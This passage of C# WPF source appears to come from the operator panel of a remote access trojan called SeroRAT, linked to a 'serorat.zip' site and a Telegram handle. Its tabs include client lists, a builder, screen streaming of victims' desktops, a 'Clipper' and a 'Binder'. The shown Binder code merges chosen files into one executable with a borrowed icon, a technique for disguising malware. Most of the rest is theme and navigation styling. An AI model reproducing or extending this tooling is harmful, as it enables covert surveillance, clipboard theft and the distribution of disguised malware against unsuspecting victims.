                    int w = src.PixelWidth, h = src.PixelHeight, stride = w * 4;
                    pixels = System.Buffers.ArrayPool<byte>.Shared.Rent(stride * h);
                    src.CopyPixels(pixels, stride, 0);
                    var capturedPixels = pixels; pixels = null;
                    int cw = w, ch = h, cs = stride;

                    _ = Dispatcher.BeginInvoke(() =>
                    {
                        try
                        {
                            if (!_screenTiles.TryGetValue(clientId, out var img)) return;
                            if (!_tileWb.TryGetValue(clientId, out var wb)
                                || wb.PixelWidth != cw || wb.PixelHeight != ch)
                            {
                                wb = new System.Windows.Media.Imaging.WriteableBitmap(
                                    cw, ch, 96, 96, System.Windows.Media.PixelFormats.Bgr32, null);
                                _tileWb[clientId] = wb;
                                img.Source = wb;
                            }
                            wb.Lock();
                            wb.WritePixels(new Int32Rect(0, 0, cw, ch), capturedPixels, cs, 0);
                            wb.AddDirtyRect(new Int32Rect(0, 0, cw, ch));
                            wb.Unlock();
                        }
                        finally { System.Buffers.ArrayPool<byte>.Shared.Return(capturedPixels); }
                    });
                }
                catch { if (pixels != null) System.Buffers.ArrayPool<byte>.Shared.Return(pixels); }
                finally { _screenshotDecodeSlots.Release(); }
            });
        }
        catch { }
    }

    // ── Binder handlers ─────────────────────────────────────────────────

    private void BtnBinderAdd_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Title = "Add files",
            Filter = "All files (*.*)|*.*",
            Multiselect = true
        };
        if (dlg.ShowDialog() != true) return;
        foreach (var path in dlg.FileNames)
        {
            var icon = BinderGetIcon(path);
            _binderEntries.Add(new SeroServer.Binder.BinderEntry
            {
                FilePath = path,
                FileSize = new FileInfo(path).Length,
                Icon     = icon
            });
        }
    }

    private void BtnBinderRemove_Click(object sender, RoutedEventArgs e)
    {
        if (BinderGrid.SelectedItem is SeroServer.Binder.BinderEntry entry)
        {
            if (MessageBox.Show(string.Format(Lang.Get("BINDER_REMOVE_CONFIRM"), entry.FileName), Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
            _binderEntries.Remove(entry);
        }
    }

    private void BtnBinderClearAll_Click(object sender, RoutedEventArgs e)
    {
        if (_binderEntries.Count == 0) return;
        if (MessageBox.Show(string.Format(Lang.Get("BINDER_CLEAR_CONFIRM"), _binderEntries.Count), Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        _binderEntries.Clear();
    }

    private void BtnBinderUp_Click(object sender, RoutedEventArgs e)
    {
        var idx = BinderGrid.SelectedIndex;
        if (idx > 0) _binderEntries.Move(idx, idx - 1);
    }

    private void BtnBinderDown_Click(object sender, RoutedEventArgs e)
    {
        var idx = BinderGrid.SelectedIndex;
        if (idx >= 0 && idx < _binderEntries.Count - 1) _binderEntries.Move(idx, idx + 1);
    }

    private void BtnBinderSelectIcon_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Title  = "Select icon source",
            Filter = "Icon / Executable (*.ico;*.exe;*.dll)|*.ico;*.exe;*.dll|All files (*.*)|*.*"
        };
        if (dlg.ShowDialog() != true) return;
        _binderIconPath = dlg.FileName;
        BinderIconPreview.Source = BinderGetIcon(_binderIconPath);
    }

    private void BtnBinderClearIcon_Click(object sender, RoutedEventArgs e)
    {
        _binderIconPath = null;
        BinderIconPreview.Source = null;
    }

    private async void BtnBinderBuild_Click(object sender, RoutedEventArgs e)
    {
        if (_binderEntries.Count == 0) { TxtBinderStatus.Text = Lang.Get("BINDER_NO_FILES"); return; }
        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Title      = "Save binder output",
            Filter     = "Executable (*.exe)|*.exe",
            DefaultExt = ".exe",
            FileName   = "output.exe"
        };
        if (dlg.ShowDialog() != true) return;
        var output = dlg.FileName;

        BtnBinderBuild.IsEnabled = false;
        TxtBinderStatus.Text = Lang.Get("BINDER_BUILDING");

        var entries = _binderEntries.ToList();
        var icon    = _binderIconPath;
        var result  = await SeroServer.Binder.BinderBuilder.Build(
            entries, icon, output,
            msg => Dispatcher.BeginInvoke(() => TxtBinderStatus.Text = msg));

        BtnBinderBuild.IsEnabled = true;
        if (result == "OK")
        {
            TxtBinderStatus.Text = $"✓ Built → {Path.GetFileName(output)}";
        }
        else
        {
            TxtBinderStatus.Text = result.Split('\n')[0];
            System.Windows.MessageBox.Show(result, "Binder — Build Error", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error);
        }
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private struct SHFILEINFO
    {
        public nint hIcon;
        public int  iIcon;
        public uint dwAttributes;
        [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 260)] public string szDisplayName;
        [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 80)]  public string szTypeName;
    }
    [System.Runtime.InteropServices.DllImport("shell32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private static extern nint SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbFileInfo, uint uFlags);
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    private static extern bool DestroyIcon(nint hIcon);
    [System.Runtime.InteropServices.DllImport("dwmapi.dll")]
    private static extern int DwmSetWindowAttribute(IntPtr hwnd, uint dwAttribute, ref int pvAttribute, int cbAttribute);

    private void SuppressDwmBorder(bool restore = false)
    {
        try
        {
            var hwnd = new System.Windows.Interop.WindowInteropHelper(this).EnsureHandle();
            if (hwnd == IntPtr.Zero) return;
            const uint DWMWA_BORDER_COLOR = 34; // Win11 22000+
            int color = restore ? unchecked((int)0xFFFFFFFF) : unchecked((int)0xFFFFFFFE); // DEFAULT or NONE
            DwmSetWindowAttribute(hwnd, DWMWA_BORDER_COLOR, ref color, sizeof(int));
        }
        catch { }
    }

    private static void SuppressFeatureWindowBorder(System.Windows.Window win)
    {
        try
        {
            var hwnd = new System.Windows.Interop.WindowInteropHelper(win).EnsureHandle();
            if (hwnd == IntPtr.Zero) return;
            const uint DWMWA_BORDER_COLOR = 34;
            int none = unchecked((int)0xFFFFFFFE); // DWMAPI_COLOR_NONE — removes Win11 1px accent border
            DwmSetWindowAttribute(hwnd, DWMWA_BORDER_COLOR, ref none, sizeof(int));
            win.BorderBrush     = System.Windows.Media.Brushes.Transparent;
            win.BorderThickness = new System.Windows.Thickness(0);
        }
        catch { }
    }

    private static System.Windows.Media.Imaging.BitmapSource? BinderGetIcon(string path)
    {
        try
        {
            var sfi = new SHFILEINFO();
            var res = SHGetFileInfo(path, 0, ref sfi,
                (uint)System.Runtime.InteropServices.Marshal.SizeOf<SHFILEINFO>(),
                0x100 | 0x1); // SHGFI_ICON | SHGFI_SMALLICON
            if (res == 0 || sfi.hIcon == 0) return null;
            try
            {
                // Render pixels immediately through System.Drawing before destroying HICON.
                // CreateBitmapSourceFromHIcon is lazy — the HICON must stay alive until pixels
                // are materialized, so we force a full copy via ToBitmap + BitmapCacheOption.OnLoad.
                using var drIcon = System.Drawing.Icon.FromHandle(sfi.hIcon);
                using var drBmp  = drIcon.ToBitmap();
                using var ms     = new System.IO.MemoryStream();
                drBmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                ms.Position = 0;
                var bi = new System.Windows.Media.Imaging.BitmapImage();
                bi.BeginInit();
                bi.CacheOption  = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
                bi.StreamSource = ms;
                bi.EndInit();
                bi.Freeze();
                return bi;
            }
            finally { DestroyIcon(sfi.hIcon); }
        }
        catch { return null; }
    }

    private static System.Windows.Media.ImageSource? TryLoadCameraIcon()
    {
        // Start Menu shortcuts are readable without admin — SHGetFileInfo follows the .lnk to the UWP icon
        var startMenuDirs = new[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms),
            Environment.GetFolderPath(Environment.SpecialFolder.Programs),
        };
        foreach (var dir in startMenuDirs)
        {
            var lnk = Path.Combine(dir, "Camera.lnk");
            if (File.Exists(lnk)) { var ico = ShellIcon.GetFromPath(lnk); if (ico != null) return ico; }
        }
        // WindowsApps direct (requires admin on most systems)
        try
        {
            var appsDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "WindowsApps");
            if (Directory.Exists(appsDir))
            {
                var camDir = Directory.GetDirectories(appsDir, "Microsoft.WindowsCamera_*").FirstOrDefault();
                if (camDir != null)
                {
                    var exe = Path.Combine(camDir, "Camera.exe");
                    if (File.Exists(exe)) return ShellIcon.GetFromPath(exe);
                }
            }
        }
        catch { }
        return null;
    }

    private static System.Windows.Media.ImageSource MakeMicIcon()
    {
        var pink = new System.Windows.Media.SolidColorBrush(
            System.Windows.Media.Color.FromRgb(0xF3, 0x8B, 0xA8));
        var pen = new System.Windows.Media.Pen(pink, 1.3)
        {
            StartLineCap = System.Windows.Media.PenLineCap.Round,
            EndLineCap   = System.Windows.Media.PenLineCap.Round
        };
        // U-shaped stand arc
        var arc = new System.Windows.Media.PathGeometry();
        var fig = new System.Windows.Media.PathFigure { StartPoint = new System.Windows.Point(3, 6), IsClosed = false };
        fig.Segments.Add(new System.Windows.Media.QuadraticBezierSegment(
            new System.Windows.Point(8, 13), new System.Windows.Point(13, 6), true));
        arc.Figures.Add(fig);
        var dg = new System.Windows.Media.DrawingGroup();
        using (var ctx = dg.Open())
        {
            // Capsule body
            ctx.DrawRoundedRectangle(pink, null, new System.Windows.Rect(5, 1, 6, 7), 3, 3);
            // Stand arc
            ctx.DrawGeometry(null, pen, arc);
            // Pole + base
            ctx.DrawLine(pen, new System.Windows.Point(8, 11), new System.Windows.Point(8, 14));
            ctx.DrawLine(pen, new System.Windows.Point(5, 14), new System.Windows.Point(11, 14));
        }
        var img = new System.Windows.Media.DrawingImage(dg);
        img.Freeze();
        return img;
    }

    private void Close_Click(object sender, RoutedEventArgs e)
    {
        _screenTimer?.Stop();
        _server?.Stop();
        NotificationService.Shutdown();
        Application.Current.Shutdown();
    }

    private void TelegramLink_Click(object sender, RoutedEventArgs e)
    {
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
        {
            FileName = "https://t.me/serotohnine",
            UseShellExecute = true
        });
    }

    private void WebsiteLink_Click(object sender, RoutedEventArgs e)
    {
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
        {
            FileName = "https://serorat.zip",
            UseShellExecute = true
        });
    }

    private void MainTabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        if (!ReferenceEquals(e.OriginalSource, MainTabControl)) return;
        if (e.AddedItems.Count == 0) return;

        if (e.AddedItems[0] is not System.Windows.Controls.TabItem ti) return;

        // Clear log badge when user switches to the Logs tab
        if (ReferenceEquals(ti, LogsTabItem))
            LogsTab_Selected();

        // Auto-stop screen streaming when navigating away from the Screen tab
        if (!ReferenceEquals(ti, ScreenTabItem) && _screenTimer != null)
            ScreenStop_Click(this, null!);

        // Refresh All Clients grid on demand when navigating to that tab
        if (MainTabControl.SelectedIndex == 2)
            RefreshAllClients();

        // Re-run tile sizing when switching to Screen tab — viewport may have changed
        // while a different tab was active (SizeChanged fires with stale size on hidden tabs).
        if (ReferenceEquals(ti, ScreenTabItem))
            Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Loaded,
                () => ScreenScroll_SizeChanged(ScreenScroll, null!));

        var presenter = MainTabControl.Template?.FindName("PART_SelectedContentHost", MainTabControl) as ContentPresenter;
        if (presenter != null)
        {
            var ease = new System.Windows.Media.Animation.CubicEase { EasingMode = System.Windows.Media.Animation.EasingMode.EaseOut };
            presenter.BeginAnimation(OpacityProperty,
                new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(200)) { EasingFunction = ease });
            var tx = new System.Windows.Media.TranslateTransform(0, 8);
            presenter.RenderTransform = tx;
            tx.BeginAnimation(System.Windows.Media.TranslateTransform.YProperty,
                new DoubleAnimation(0, TimeSpan.FromMilliseconds(220)) { EasingFunction = ease });
        }

        SyncNavButtons(MainTabControl.SelectedIndex);
    }

    // ── Sidebar navigation ───────────────────────────────────────────

    private bool _navSyncing;
    private bool _langSyncing;

    private (byte alpha, float lighten) GlowParams()
    {
        if (TryFindResource("SidebarBgBrush") is System.Windows.Media.SolidColorBrush sb)
        {
            float lum = (sb.Color.R * 0.299f + sb.Color.G * 0.587f + sb.Color.B * 0.114f) / 255f;
            if (lum > 0.5f) return (0x70, 0.05f); // light sidebar: saturated accent, higher alpha
        }
        return (0x50, 0.30f); // dark sidebar: lightened accent, standard alpha
    }

    private void NavBtn_MouseMove(object sender, System.Windows.Input.MouseEventArgs e)
    {
        if (sender is not System.Windows.Controls.RadioButton btn) return;
        if (btn.Template.FindName("SpotGlow", btn) is not Border glow) return;
        if (glow.Background is not System.Windows.Media.RadialGradientBrush rgb) return;
        if (rgb.IsFrozen) { rgb = rgb.Clone(); glow.Background = rgb; }
        if (TryFindResource("AccentColor") is System.Windows.Media.Color accent)
        {
            var (alpha, lighten) = GlowParams();
            byte hr = (byte)(accent.R + (255 - accent.R) * lighten);
            byte hg = (byte)(accent.G + (255 - accent.G) * lighten);
            byte hb = (byte)(accent.B + (255 - accent.B) * lighten);
            rgb.GradientStops[0].Color = System.Windows.Media.Color.FromArgb(alpha, hr, hg, hb);
        }
        var pos = e.GetPosition(btn);
        double cx = pos.X / Math.Max(btn.ActualWidth, 1);
        double cy = pos.Y / Math.Max(btn.ActualHeight, 1);
        rgb.GradientOrigin = new System.Windows.Point(cx, cy);
        rgb.Center         = new System.Windows.Point(cx, cy);
    }

    private void NavBtn_MouseLeave(object sender, System.Windows.Input.MouseEventArgs e)
    {
        if (sender is not System.Windows.Controls.RadioButton btn) return;
        if (btn.Template.FindName("SpotGlow", btn) is not Border glow) return;
        if (glow.Background is not System.Windows.Media.RadialGradientBrush rgb) return;
        if (rgb.IsFrozen) { rgb = rgb.Clone(); glow.Background = rgb; }
        rgb.GradientOrigin = new System.Windows.Point(0.5, 0.5);
        rgb.Center         = new System.Windows.Point(0.5, 0.5);
    }

    private void ApplyNavBtnGlow(System.Windows.Controls.RadioButton btn)
    {
        try
        {
            btn.ApplyTemplate();
            if (btn.Template.FindName("SpotGlow", btn) is not Border glow) return;
            if (glow.Background is not System.Windows.Media.RadialGradientBrush rgb) return;
            if (rgb.IsFrozen) { rgb = rgb.Clone(); glow.Background = rgb; }
            if (TryFindResource("AccentColor") is System.Windows.Media.Color accent)
            {
                var (alpha, lighten) = GlowParams();
                byte hr = (byte)(accent.R + (255 - accent.R) * lighten);
                byte hg = (byte)(accent.G + (255 - accent.G) * lighten);
                byte hb = (byte)(accent.B + (255 - accent.B) * lighten);
                rgb.GradientStops[0].Color = System.Windows.Media.Color.FromArgb(alpha, hr, hg, hb);
                rgb.GradientOrigin = new System.Windows.Point(0.5, 0.5);
                rgb.Center         = new System.Windows.Point(0.5, 0.5);
            }
        }
        catch { }
    }


    private void Nav_Checked(object sender, RoutedEventArgs e)
    {
        if (_navSyncing || !IsLoaded) return;
        if (sender is not System.Windows.Controls.RadioButton rb) return;
        int idx = rb.Name switch
        {
            "NavDashboard"  => 0,
            "NavOnline"     => 1,
            "NavAllClients" => 2,
            "NavBuilder"    => 3,
            "NavAutoTask"   => 4,
            "NavScreen"     => 5,
            "NavClipper"    => 6,
            "NavBinder"     => 7,
            "NavWinNotify"  => 8,
            "NavLogs"       => 9,
            "NavSettings"   => 10,
            "NavAbout"      => 11,
            _               => -1
        };
        if (idx >= 0 && MainTabControl.SelectedIndex != idx)
            MainTabControl.SelectedIndex = idx;
        if (idx >= 0) UiPrefs.Set("ActiveNav", idx);
        if (idx >= 0 && sender is System.Windows.Controls.RadioButton rb2) ApplyNavBtnGlow(rb2);
    }

    private void SyncNavButtons(int idx)
    {
        _navSyncing = true;
        System.Windows.Controls.RadioButton?[] btns =
        [
            NavDashboard, NavOnline, NavAllClients, NavBuilder, NavAutoTask,
            NavScreen, NavClipper, NavBinder, NavWinNotify, NavLogs, NavSettings, NavAbout
        ];
        if (idx >= 0 && idx < btns.Length)
        {
            var btn = btns[idx];
            if (btn != null && btn.IsChecked != true) btn.IsChecked = true;
        }
        _navSyncing = false;
    }

    // ── Theme Picker ─────────────────────────────────────────────────

    private record ThemeEntry(string Key, string DisplayName, string Category,
        string IconBg, string IconBar, string? IconText = null, string? DxIconSvg = null);

    private static readonly List<ThemeEntry> _allThemes = new()
    {
        new("SeroDark",              "Sero Dark",           "CUSTOM",   "#0C0D18", "#111222"),                                                           // real image
        new("DXStyle",               "DevExpress Style",    "DEFAULT",  "#EEF2F8", "#3E6FA8",  null, "SvgImages/Business Objects/BO_Dashboard.svg"),
        new("MetropolisDark",        "DevExpress Dark",     "DEFAULT",  "#1C2030", "#3060A8",  null, "SvgImages/Business Objects/BO_Dashboard.svg"),
        new("Office2019Colorful",    "Office 2019 Colorful","O. 2019",  "#EDEEF0", "#2B579A",  null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("Office2019Black",       "Office 2019 Black",   "O. 2019",  "#1D1D1D", "#1A1A1A",  null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("Office2019White",       "Office 2019 White",   "O. 2019",  "#FFFFFF",  "#2B579A", null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("Office2019DarkGray",    "Office 2019 Dark",    "O. 2019",  "#2D2D2D", "#2B579A",  null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("Office2019HighContrast","High Contrast",       "O. 2019",  "#000000", "#CCCC00",  null, "SvgImages/Business Objects/BO_Validation.svg"),
        new("Office2016Colorful",    "Office 2016 Colorful","O. 2016",  "#E8EEF8", "#2B6CB0",  null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("Office2016DarkGraySE",  "Office 2016 Dark",    "O. 2016",  "#2F2F2F", "#2B6CB0",  null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("Office2016Black",       "Office 2016 Black",   "O. 2016",  "#1A1A1A", "#2B6CB0",  null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("Office2013",            "Office 2013 White",   "O. 2013",  "#FFFFFF",  "#2972BF", null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("Office2013DarkGray",    "Office 2013 Dark",    "O. 2013",  "#414141", "#2972BF",  null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("VS2017Blue",            "VS 2013 Blue",        "VS",       "#2B3566", "#007ACC",  null, "SvgImages/Business Objects/BO_Document.svg"),
        new("VS2017Dark",            "VS 2013 Dark",        "VS",       "#1E1E1E", "#007ACC",  null, "SvgImages/Business Objects/BO_Document.svg"),
        new("VS2017Light",           "VS 2013 Light",       "VS",       "#F5F5F5", "#007ACC",  null, "SvgImages/Business Objects/BO_Document.svg"),
        new("VS2010",                "Visual Studio 2010",  "VS",       "#1F2231", "#5E9CD3",  null, "SvgImages/Business Objects/BO_Document.svg"),
        new("Office2010Blue",        "Office 2010 Blue",    "O. 2010",  "#D6E4F0", "#1B5B99",  null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("Office2010Black",       "Office 2010 Black",   "O. 2010",  "#3A3A3A", "#1B5B99",  null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("Office2010Silver",      "Office 2010 Silver",  "O. 2010",  "#DFE0E4", "#5A6070",  null, "SvgImages/Business Objects/BO_Appointment.svg"),
        new("Seven",                 "Seven Classic",       "THEMATIC", "#D0E3F5", "#1A65BD",  "7"),                                                     // real image
        new("TheBezier",             "The Bezier",          "VECTOR",   "#2C303A", "#E07B39",  null, "SvgImages/Business Objects/BO_Appearance.svg"),
    };

    private string _themePickerSearch = "";

    // ── Theme ────────────────────────────────────────────────────────

    private static readonly Dictionary<string, System.Windows.Media.Color> _themeColors = new()
    {
        // ── Custom ──────────────────────────────────────────────────────────────
        ["SeroDark"]             = System.Windows.Media.Color.FromRgb(0x4A, 0x85, 0xF5),
        // ── Visual Studio ───────────────────────────────────────────────────────
        ["VS2010"]               = System.Windows.Media.Color.FromRgb(0x5E, 0x9C, 0xD3),
        ["VS2017Blue"]           = System.Windows.Media.Color.FromRgb(0x00, 0x7A, 0xCC),
        ["VS2017Dark"]           = System.Windows.Media.Color.FromRgb(0x00, 0x7A, 0xCC),
        ["VS2017Light"]          = System.Windows.Media.Color.FromRgb(0x00, 0x7A, 0xCC),
        // ── Previous Office ─────────────────────────────────────────────────────
        ["Office2010Blue"]       = System.Windows.Media.Color.FromRgb(0x1B, 0x5B, 0x99),
        ["Office2010Black"]      = System.Windows.Media.Color.FromRgb(0x4A, 0x7F, 0xFF),
        ["Office2010Silver"]     = System.Windows.Media.Color.FromRgb(0x40, 0x70, 0xB0),
        // ── Office 2019 ──────────────────────────────────────────────────────────
        ["Office2019Colorful"]   = System.Windows.Media.Color.FromRgb(0x2B, 0x57, 0x9A),
        ["Office2019Black"]      = System.Windows.Media.Color.FromRgb(0x30, 0x60, 0xA0),
        ["Office2019White"]      = System.Windows.Media.Color.FromRgb(0x2B, 0x57, 0x9A),
        ["Office2019DarkGray"]   = System.Windows.Media.Color.FromRgb(0x2B, 0x57, 0x9A),
        // ── Office 2016 ──────────────────────────────────────────────────────────
        ["Office2016Colorful"]   = System.Windows.Media.Color.FromRgb(0x2B, 0x6C, 0xB0),
        ["Office2016DarkGraySE"] = System.Windows.Media.Color.FromRgb(0x50, 0x90, 0xC8),
        ["Office2016Black"]      = System.Windows.Media.Color.FromRgb(0x4A, 0x80, 0xC8),
        // ── Office 2013 ──────────────────────────────────────────────────────────
        ["Office2013"]           = System.Windows.Media.Color.FromRgb(0x29, 0x72, 0xBF),
        ["Office2013DarkGray"]   = System.Windows.Media.Color.FromRgb(0x1B, 0xBB, 0xF0),
        // ── Default (DevExpress) ─────────────────────────────────────────────────
        ["DXStyle"]              = System.Windows.Media.Color.FromRgb(0x3E, 0x6F, 0xA8),
        ["MetropolisDark"]       = System.Windows.Media.Color.FromRgb(0x55, 0x88, 0xD8),
        ["Office2019HighContrast"] = System.Windows.Media.Color.FromRgb(0xFF, 0xFF, 0x00),
        // ── Thematic ─────────────────────────────────────────────────────────────
        ["Seven"]                = System.Windows.Media.Color.FromRgb(0x22, 0x68, 0xB8),
        // ── Vector ───────────────────────────────────────────────────────────────
        ["TheBezier"]            = System.Windows.Media.Color.FromRgb(0x3E, 0x6F, 0xA8),
    };

    private static readonly Dictionary<string, string> _themeSidebarColors = new()
    {
        ["SeroDark"]             = "#0D0F1E",
        ["VS2010"]               = "#1A1C2E",
        ["VS2017Blue"]           = "#1A2348",
        ["VS2017Dark"]           = "#252526",
        ["VS2017Light"]          = "#E7E8EC",
        ["Office2010Blue"]       = "#1B5B99",
        ["Office2010Black"]      = "#242424",
        ["Office2010Silver"]     = "#B8BFCC",
        ["Office2019Colorful"]   = "#2B579A",
        ["Office2019Black"]      = "#161616",
        ["Office2019White"]      = "#2B579A",
        ["Office2019DarkGray"]   = "#252525",
        ["Office2016Colorful"]   = "#2B6CB0",
        ["Office2016DarkGraySE"] = "#262626",
        ["Office2016Black"]      = "#111111",
        ["Office2013"]           = "#2972BF",
        ["Office2013DarkGray"]   = "#353535",
        ["DXStyle"]              = "#3E6FA8",
        ["MetropolisDark"]       = "#161B28",
        ["Office2019HighContrast"] = "#000000",
        ["Seven"]                = "#FFFFFF",
        ["TheBezier"]            = "#252A38",
    };

    private void ApplyTheme(string name)
    {
        if (!_themeColors.TryGetValue(name, out var color)) return;

        // Immediately set the outline border to match the new theme — no DynamicResource on the element
        // so this local value is the only authority (no DX resource machinery can override it)
        if (OutlineBorder != null)
        {
            if (name == "SeroDark")
            {
                OutlineBorder.BorderBrush     = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x1E, 0x20, 0x38));
                OutlineBorder.BorderThickness = new System.Windows.Thickness(1);
            }
            else
            {
                OutlineBorder.BorderBrush     = System.Windows.Media.Brushes.Transparent;
                OutlineBorder.BorderThickness = new System.Windows.Thickness(0);
            }
        }

        // Kill the Windows 11 DWM 1px accent border for all non-dark themes.
        // DWMWA_BORDER_COLOR=34 (Win11 22000+) with DWMAPI_COLOR_NONE removes the OS frame line
        // that bleeds through when the user's Windows accent color is purple/vivid.
        SuppressDwmBorder(restore: name == "SeroDark");

        // Custom accent color override — skip for Seven Classic which uses a fixed Aero blue
        if (name != "Seven")
        {
            var customAccentHex = UiPrefs.GetString("CustomAccent", "");
            if (!string.IsNullOrEmpty(customAccentHex))
            {
                try { color = (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(customAccentHex); }
                catch { /* invalid stored color — use theme default */ }
            }
        }

        string dxName = name switch
        {
            "SeroDark"  => "VS2017Dark",
            "TheBezier" => "MetropolisDark",
            _           => name
        };

        try { DevExpress.Xpf.Core.ApplicationThemeHelper.ApplicationThemeName = dxName; }
        catch { /* DevExpress not loaded — colour palette still applies */ }
        try { DevExpress.Xpf.Core.ThemeManager.SetThemeName(this, dxName); }
        catch { }
        // Force window chrome redraw to prevent border bleed when switching DX themes
        Dispatcher.BeginInvoke(() => { InvalidateVisual(); UpdateLayout(); },
            System.Windows.Threading.DispatcherPriority.Render);
        // Re-apply custom brushes after DX theme async updates (which run at Render priority)
        var _snapColor = color;
        var _snapName  = name;
        Dispatcher.BeginInvoke(() =>
        {
            var r2 = Application.Current.Resources;
            var reapplied = new System.Windows.Media.SolidColorBrush(_snapColor); reapplied.Freeze();
            r2["AccentBrush"] = reapplied;
            r2["AccentColor"] = _snapColor;
            Resources["AccentBrush"] = reapplied;
            Resources["AccentColor"] = _snapColor;
            // Re-apply section border so DX theme can't overwrite it
            if (r2["SectionBorderBrush"] is System.Windows.Media.SolidColorBrush sb)
            {
                var fresh = new System.Windows.Media.SolidColorBrush(sb.Color); fresh.Freeze();
                r2["SectionBorderBrush"] = fresh;
            }
            // Final authoritative override for window outline — DX async mutations cannot win after this
            System.Windows.Media.Brush outlineBrush;
            System.Windows.Thickness  outlineThick;
            if (_snapName == "SeroDark")
            {
                outlineBrush = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x1E, 0x20, 0x38));
                outlineThick = new System.Windows.Thickness(1);
            }
            else
            {
                outlineBrush = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.Transparent);
                outlineThick = new System.Windows.Thickness(0);
            }
            outlineBrush.Freeze();
            r2["WindowOutlineBrush"]     = outlineBrush;
            r2["WindowOutlineThickness"] = outlineThick;
            Resources["WindowOutlineBrush"]     = outlineBrush;
            Resources["WindowOutlineThickness"] = outlineThick;
            if (OutlineBorder != null)
            {
                OutlineBorder.BorderBrush     = outlineBrush;
                OutlineBorder.BorderThickness = outlineThick;
            }
            // Restore DataGridCell implicit style — DX may have overwritten it in Application.Resources
            if (Application.Current.TryFindResource("SDGCell") is System.Windows.Style dgcStyle)
                Application.Current.Resources[typeof(System.Windows.Controls.DataGridCell)] = dgcStyle;

            // Selection: lighter translucent tint so text stays readable
            var hlColor = System.Windows.SystemColors.HighlightColor;
            var selBrush = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromArgb(0x45, hlColor.R, hlColor.G, hlColor.B));
            selBrush.Freeze();
            r2["RowSelBgBrush"] = selBrush;
            Resources["RowSelBgBrush"] = selBrush;

            // Hover: lighter than selection so the two states are clearly distinct
            var hoverBrush = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromArgb(0x22, hlColor.R, hlColor.G, hlColor.B));
            hoverBrush.Freeze();
            r2["RowHoverBgBrush"] = hoverBrush;
            Resources["RowHoverBgBrush"] = hoverBrush;

            System.Windows.Controls.RadioButton?[] _navBtns =
            [
                NavDashboard, NavOnline, NavAllClients, NavBuilder, NavAutoTask,
                NavScreen, NavClipper, NavBinder, NavWinNotify, NavLogs, NavSettings, NavAbout
            ];
            foreach (var nb in _navBtns)
                if (nb?.IsChecked == true) ApplyNavBtnGlow(nb);

        }, System.Windows.Threading.DispatcherPriority.ContextIdle);

        // Write to Application.Current.Resources so ALL open windows update immediately
        // (ServerWindow, feature windows, NotificationPopup — every DynamicResource binding)
        var res = Application.Current.Resources;

        System.Windows.Media.SolidColorBrush B(string hex)
        {
            var b = new System.Windows.Media.SolidColorBrush(
                (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(hex));
            b.Freeze();
            return b;
        }

        var accentBrush = new System.Windows.Media.SolidColorBrush(color);
        accentBrush.Freeze();
        res["AccentBrush"] = accentBrush;
        res["BtnPrimaryBgBrush"] = accentBrush;  // reset to accent; Seven Classic overrides below
        res["AccentColor"] = color;

        // Default outline: transparent (overridden to accentBrush+1px for SeroDark below)
        res["WindowOutlineBrush"]     = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.Transparent);
        res["WindowOutlineThickness"] = new System.Windows.Thickness(0);

        // Also propagate to window-level resources so inline StaticResource fallbacks resolve
        Resources["AccentBrush"] = accentBrush;
        Resources["AccentColor"] = color;

        // Aurora bar: visible for all dark themes, hidden for light themes
        if (AuroraBar != null)
            AuroraBar.Visibility = _lightThemeKeys.Contains(name) ? Visibility.Collapsed : Visibility.Visible;

        // Update sidebar via DynamicResource so the binding in XAML updates automatically
        if (_themeSidebarColors.TryGetValue(name, out var sideHex))
        {
            res["SidebarBgBrush"] = B(sideHex);
            var sc = (Color)System.Windows.Media.ColorConverter.ConvertFromString(sideHex);
            res["SidebarBorderBrush"] = (sc.R + sc.G + sc.B) / 3 > 100 ? B("#9AAABB") : B("#1C1E30");
        }
        // Also update PrimaryGradient to match accent so SGreenBtn adapts
